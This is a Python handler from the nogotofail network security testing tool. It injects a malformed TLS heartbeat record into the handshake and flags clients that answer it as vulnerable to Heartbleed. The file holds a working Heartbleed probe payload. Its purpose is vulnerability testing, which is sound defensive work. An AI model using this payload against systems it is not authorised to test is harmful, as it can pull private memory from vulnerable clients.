r'''
Copyright 2014 Google Inc. All rights reserved.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
'''
import logging
from nogotofail.mitm import util
from nogotofail.mitm.connection.handlers.connection import LoggingHandler
from nogotofail.mitm.connection.handlers.connection import handlers
from nogotofail.mitm.connection.handlers.store import handler
from nogotofail.mitm.event import connection
from nogotofail.mitm.util import tls
from nogotofail.mitm.util.tls.types import TlsRecord


@handler(handlers, default=True)
class ClientHeartbleedHandler(LoggingHandler):

    name = "clientheartbleed"
    description = (
        "Sends a heartbleed message to the client during the SSL handshake")
    heartbleed = "\x18%s\x00\x14\x01\x00\x02\xFE" + "\xFF" * 16
    first = True
    success = False

    def on_request(self, request):
        # parse out request and check for heartbeat
        try:
            remaining = request
            while remaining:
                record, remaining = tls.parse_tls(remaining)
                if record.content_type == TlsRecord.CONTENT_TYPE.HEARTBEAT:
                    self.log(logging.CRITICAL, "Heartbleed response received")
                    self.log_event(
                        logging.CRITICAL,
                        connection.AttackEvent(
                            self.connection, self.name,
                            True, None))
                    self.connection.vuln_notify(
                        util.vuln.VULN_TLS_CLIENT_HEARTBLEED)
                    self.success = True
        except:
            pass
        return request

    def on_close(self, handler_initiated):
        super(ClientHeartbleedHandler, self).on_close(handler_initiated)
        if not self.success:
            self.log_event(
                logging.INFO,
                connection.AttackEvent(
                    self.connection, self.name, False,
                    None))

    def on_response(self, response):
        if self.first:
            try:
                record, remaining = tls.parse_tls(response)
                version = record.version
                response = (record.to_bytes()
                            + self.heartbleed % (version.to_bytes())
                            + remaining)
            except:
                self.log(logging.INFO, "Failed to parse TLS record from server")
            self.first = False

        return response
